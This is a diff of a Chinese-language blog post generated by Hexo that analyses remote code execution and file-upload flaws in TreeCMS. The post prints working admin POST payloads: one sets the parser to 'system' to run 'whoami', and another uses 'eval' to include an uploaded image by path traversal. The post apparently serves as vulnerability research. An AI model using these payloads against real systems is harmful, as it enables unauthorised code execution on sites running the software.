@@ -70,7 +70,9 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -175,10 +177,8 @@
 <h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><strong>RCE</strong></p>
 <p>exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__csrf_token_8RR12GMPJ6EHBQGB3VUL0BE6NHVDQAKC__=aUUlSjf%2BRjg1bh0IjKYGO%2F50CHlxHB4Wq1VVc3v2OUQ%3D&amp;id=RacerZ1&amp;name=RacerZ1&amp;type=list&amp;settings=&#123;&quot;list_type&quot;:&quot;static&quot;,&quot;allow-empty&quot;:&quot;Yes&quot;,&quot;list&quot;:&quot;whoami&quot;,&quot;pop-table&quot;:&quot;&quot;,&quot;parser&quot;:&quot;system&quot;&#125;&amp;description=&lt;p&gt;Test rce&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">../../../../site/files/3.jpg</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216123845075.png" alt="image-20221216123845075"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__csrf_token_MRMF7MRPG9CQD453P0JB4CT4LQBR3RQJ__=CmxtdkAZ5T31L8IDY03W7AIrECu%2BkV3sqFzvepUNZh4%3D&amp;id=1&amp;name=12&amp;type=text&amp;settings=null&amp;description=1212</span><br></pre></td></tr></table></figure>
-
 <p>定位路由 <code>site/index.php/admin/developer/settings/create/</code>对于的处理代码在<code>core/admin/modules/developer/settings/create.php</code> 注意token要及时更换。经过token鉴定之后跟入<code>createSetting()</code></p>
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216124424861.png" alt="image-20221216124424861"></p>
 <p>这里可以看到会对POST传参的<code>settings</code>字段进行json解码</p>
@@ -204,7 +204,7 @@
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216145516030.png" alt="image-20221216145516030"></p>
 <p>之后根据条件分支会include该php页面，进而跟入</p>
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216153301604.png" alt="image-20221216153301604"></p>
-<p>里面可以看到会先判断<code>$field[&quot;settings&quot;][&quot;list_type&quot;]</code>，这里我们设置成了static，因此会直接将<code> $field[&quot;settings&quot;][&quot;list&quot;]</code>中的值赋给list变量</p>
+<p>里面可以看到会先判断<code>$field[&quot;settings&quot;][&quot;list_type&quot;]</code>，这里我们设置成了static，因此会直接将<code>$field[&quot;settings&quot;][&quot;list&quot;]</code>中的值赋给list变量</p>
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216145457580.png" alt="image-20221216145457580"></p>
 <p>往下看到有个利用函数<code>call_user_func()</code>可以利用，且参数均可控。所以再将<code>$field[&quot;settings&quot;][&quot;parser&quot;]</code>设置成系统函数，便可达到调用命令执行。接下来看下回显点</p>
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216153451755.png" alt="image-20221216153451755"></p>
@@ -212,15 +212,10 @@
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216153758152.png" alt="image-20221216153758152"></p>
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216153849404.png" alt="image-20221216153849404"></p>
 <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__csrf_token_8RR12GMPJ6EHBQGB3VUL0BE6NHVDQAKC__=aUUlSjf%2BRjg1bh0IjKYGO%2F50CHlxHB4Wq1VVc3v2OUQ%3D&amp;id=upload_img7&amp;name=upload_img7&amp;type=image&amp;settings=&#123;&quot;thumbnails&quot;:&#123;&quot;thumbnail&quot;:&#123;&quot;width&quot;: 5,&quot;height&quot;: 5, &quot;pop-table1&quot;: &quot;&quot;&#125;&#125;, &quot;pop-table2&quot;: &quot;&quot;, &quot;crops&quot;: &#123;&quot;crop&quot;: &#123;&quot;width&quot;: 5, &quot;height&quot;: 5, &quot;pop-table3&quot;: &quot;&quot;&#125;&#125;&#125;&amp;description=Upload_Img</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216202929293.png" alt="image-20221216202929293"></p>
 <p><img src="/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/image-20221216202955227.png" alt="image-20221216202955227"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__csrf_token_XUGVJ45MM1WTTVVAENRUK85J00WV924R__=9yaM9zmpCkbY4M0BbiwQ%2F8vtlPSvhKrxzkOb%2FKqQqFk%3D&amp;id=last_chance1&amp;name=last_chance1&amp;type=list&amp;settings=&#123;&quot;list_type&quot;:&quot;static&quot;,&quot;allow-empty&quot;:&quot;Yes&quot;,&quot;list&quot;:&quot;include ./../../../site/files/3.jpg;&quot;,&quot;pop-table&quot;:&quot;&quot;,&quot;parser&quot;:&quot;eval&quot;&#125;&amp;description=&lt;p&gt;Test rce&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__csrf_token_XUGVJ45MM1WTTVVAENRUK85J00WV924R__=9yaM9zmpCkbY4M0BbiwQ%2F8vtlPSvhKrxzkOb%2FKqQqFk%3D&amp;id=upload_img7&amp;name=upload_img7&amp;type=image&amp;settings=&#123;&quot;thumbnails&quot;:&#123;&quot;thumbnail&quot;:&#123;&quot;width&quot;: 5,&quot;height&quot;: 5, &quot;pop-table1&quot;: &quot;&quot;&#125;&#125;, &quot;pop-table2&quot;: &quot;&quot;, &quot;crops&quot;: &#123;&quot;crop&quot;: &#123;&quot;width&quot;: 5, &quot;height&quot;: 5, &quot;pop-table3&quot;: &quot;&quot;&#125;&#125;&#125;&amp;description=Upload_Img</span><br></pre></td></tr></table></figure>
-
 
   </div>
 </article>
